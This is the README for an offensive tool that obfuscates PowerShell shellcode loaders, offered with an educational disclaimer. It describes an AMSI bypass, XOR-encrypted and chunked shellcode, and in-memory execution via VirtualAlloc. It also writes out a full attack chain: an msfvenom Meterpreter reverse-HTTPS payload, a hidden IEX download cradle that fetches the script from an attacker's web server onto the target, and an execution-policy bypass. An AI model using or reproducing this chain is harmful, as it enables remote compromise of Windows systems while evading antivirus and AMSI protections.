# AdaptixPowerShell - Advanced PowerShell Payload Obfuscator

An advanced PowerShell payload generator with Chimera-style obfuscation, XOR encryption, and aggressive anti-detection techniques.

## ⚠️ DISCLAIMER

**THIS PROJECT IS INTENDED FOR EDUCATIONAL PURPOSES AND SECURITY RESEARCH ONLY**

This tool is designed for:
- **Security research and study**: Understanding obfuscation techniques and payload delivery mechanisms
- **Enhancing detection capabilities**: Helping blue teams and security researchers improve their detection rules and defensive strategies
- **Authorized penetration testing**: Only in controlled environments with explicit written permission

### Important Requirements:
- ✅ **MUST** be used only in controlled, isolated laboratory environments
- ✅ **MUST** have explicit written authorization before testing on any system
- ✅ **MUST NOT** be used for unauthorized access or malicious purposes
- ⚠️ Unauthorized access to computer systems is **illegal** and may result in severe legal consequences

The authors and contributors assume **NO LIABILITY** for misuse, damage, or illegal activities conducted with this tool. By using this software, you agree to use it responsibly and in accordance with all applicable laws and regulations.

---

## Features

### 🎭 Chimera-Style Obfuscation
- AMSI bypass string chunking
- `System.Management.Automation` string obfuscation
- `amsiInitFailed` field name obfuscation
- Random variable names (15-25 characters)
- Random indentation
- Backtick injection in cmdlets

### 🔐 Payload Encryption & Chunking
- XOR encryption of shellcode
- Encrypted payload split into 2-5 chunks
- Random variable names for each chunk
- Runtime concatenation before decryption

### 🛡️ C# P/Invoke Obfuscation
- `kernel32.dll` split into 4 random const strings
- Random class names (replaces `Win32`)
- Random method names (replaces `VirtualAlloc`)
- Random delegate names (replaces `ShellcodeDelegate`)
- EntryPoint remapping



## Installation

```bash
git clone <repository-url>
cd hostpayload
chmod +x adaptixpowerShell.py
```

## Usage

### Basic Usage

```bash
# Generate obfuscated payload (default level 3)
python3 adaptixpowerShell.py shellcode.bin

# Specify obfuscation level (1-5)
python3 adaptixpowerShell.py shellcode.bin -l 4

# Enable debug mode
python3 adaptixpowerShell.py shellcode.bin -d

# Disable obfuscation
python3 adaptixpowerShell.py shellcode.bin --no-obfuscate
```

### Obfuscation Levels

- **Level 1**: Low obfuscation, faster execution
- **Level 2**: Medium obfuscation
- **Level 3**: High obfuscation (default)
- **Level 4**: Higher obfuscation
- **Level 5**: Maximum obfuscation

### Output

The script generates three delivery methods:

1. **Direct Download**:
   ```powershell
   powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://IP:PORT/payload.ps1')"
   ```

2. **Base64 Encoded**:
   ```powershell
   powershell -nop -w hidden -enc <base64_string>
   ```

3. **PowerShell File**: `<random>.ps1`

## Examples

### Generate Meterpreter Payload

```bash
# Generate raw shellcode with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  EXITFUNC=thread -f raw -o shell.bin

# Obfuscate with AdaptixPowerShell
python3 adaptixpowerShell.py shell.bin -l 4

# Start web server
python3 -m http.server 80

# Execute on target
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/xyz123.ps1')"
```

### Debug Mode

Use debug mode to verify decryption is working:

```bash
python3 adaptixpowerShell.py shellcode.bin -d
```

Debug output will show:
- Encrypted payload length
- Decryption key length
- Decrypted payload length
- First 16 bytes of decrypted shellcode

## How It Works

1. **AMSI Bypass**: Disables AMSI using reflection to access `amsiInitFailed` field
2. **Encryption**: XOR encrypts the shellcode with a random 16-byte key
3. **Chunking**: Splits encrypted payload into multiple variables
4. **Obfuscation**: Applies Chimera-style obfuscation techniques
5. **Decryption**: PowerShell decrypts XOR payload at runtime
6. **Injection**: Uses `VirtualAlloc` + `Marshal.Copy` for in-memory execution

## Obfuscation Techniques

### String Chunking
```powershell
# Before
$dll = "kernel32.dll"

# After
$vKudKDAuMJHv = "ker"
$DOOqHAdQjVXYBFc = "nel"
$knbATApFWUpN = "32."
$hNverCTTZdykJ = "dll"
$dll = $vKudKDAuMJHv + $DOOqHAdQjVXYBFc + $knbATApFWUpN + $hNverCTTZdykJ
```

### Payload Chunking
```powershell
[Byte[]] $chunk1 = 0x62,0xBE,0x41,0xB7...
[Byte[]] $chunk2 = 0xF7,0xF5,0xBB,0x2D...
[Byte[]] $chunk3 = 0x4D,0x90,0xF7,0x58...
[Byte[]] $encrypted = $chunk1 + $chunk2 + $chunk3
```

### C# Class Obfuscation
```csharp
// Before
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(...);
}

// After
private const string vKudKDAuMJHv = "ker";
private const string DOOqHAdQjVXYBFc = "nel";
private const string knbATApFWUpN = "32.";
private const string hNverCTTZdykJ = "dll";

public class UwZtTEjJflziJLL {
    [DllImport(vKudKDAuMJHv + DOOqHAdQjVXYBFc + knbATApFWUpN + hNverCTTZdykJ, EntryPoint = "VirtualAlloc")]
    public static extern IntPtr nTUEhCagiLrPlou(...);
}
```

## Detection Evasion

### ✅ Bypassed/Obfuscated
- Static signature detection
- String-based AV signatures
- Hash-based detection (different each run)
- AMSI (bypassed)
- Simple obfuscation detection

### ⚠️ Still Detectable
- Behavioral analysis (memory allocation patterns)
- Advanced EDR with behavioral heuristics
- Network-based IDS/IPS (for download cradles)
- ETW (Event Tracing for Windows)

## Testing

Always test your payloads in a controlled environment:

```bash
# Create test shellcode (NOP sled)
python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 8)" > test.bin

# Generate payload
python3 adaptixpowerShell.py test.bin -l 3 -d

# Test execution (should not crash)
powershell -ExecutionPolicy Bypass -File generated_payload.ps1
```

## Troubleshooting

### Payload Not Executing

1. **Verify shellcode is correct architecture (x64 vs x86)**
2. **Check EXITFUNC in msfvenom** (use `thread` not `process`)
3. **Enable debug mode** to verify decryption




## Credits

Inspired by:
- [Chimera](https://github.com/tokyoneon/Chimera) - PowerShell obfuscation
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) - Obfuscation techniques

## License

This project is provided "as-is" for educational and research purposes. Use responsibly and only in controlled environments or on systems you own or have explicit written permission to test.

---

**Note**: This tool generates payloads that may be flagged by antivirus and EDR software. Always test in isolated, controlled environments and obtain proper authorization before any security assessment.
